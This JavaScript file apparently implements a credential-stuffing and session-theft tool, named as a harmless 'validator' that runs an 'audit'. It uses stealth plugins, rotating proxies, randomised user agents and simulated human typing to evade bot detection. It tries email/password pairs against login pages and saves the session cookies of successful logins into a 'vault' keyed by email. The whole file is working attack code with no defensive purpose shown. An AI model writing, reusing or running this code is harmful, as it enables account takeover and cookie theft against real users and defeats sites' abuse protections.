import { firefox } from 'playwright-extra';
import stealth from 'puppeteer-extra-plugin-stealth';
import fs from 'fs';

firefox.use(stealth());

class AegisValidator {
  constructor() {
    this.gateways = this.loadGateways();
    this.index = 0;
    this.profiles = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0'
    ];
  }

  loadGateways() {
    return fs.existsSync('gateway-nodes.txt') ? fs.readFileSync('gateway-nodes.txt', 'utf8').split('\n').filter(Boolean) : [];
  }

  async runAudit(identity, endpoint = 'portal') {
    const gateway = this.gateways[this.index++ % this.gateways.length];
    const browser = await firefox.launch({ headless: true });
    const context = await browser.newContext({
      userAgent: this.profiles[Math.floor(Math.random() * this.profiles.length)],
      proxy: gateway ? { server: gateway } : undefined
    });

    const page = await context.newPage();
    try {
      const url = endpoint.includes('http') ? endpoint : `https://${endpoint}.com/login`;
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
      await page.mouse.move(Math.random() * 500, Math.random() * 500);
      
      await page.type('input[type="email"], input[name="email"]', identity.email, { delay: Math.random() * 100 + 50 });
      await page.type('input[type="password"], input[name="password"]', identity.pass, { delay: Math.random() * 100 + 50 });
      
      await Promise.all([
        page.click('button[type="submit"]'),
        page.waitForNavigation({ timeout: 15000 }).catch(() => null)
      ]);

      const isVerified = page.url().includes('dashboard') || await page.$('.user-settings, .logout-btn') !== null;
      if (isVerified) {
        const tokens = await context.cookies();
        if (!fs.existsSync('./vault')) fs.mkdirSync('./vault');
        fs.writeFileSync(`./vault/${identity.email}.json`, JSON.stringify(tokens));
      }
      await browser.close();
      return isVerified;
    } catch (e) {
      await browser.close();
      return false;
    }
  }
}
export default new AegisValidator();
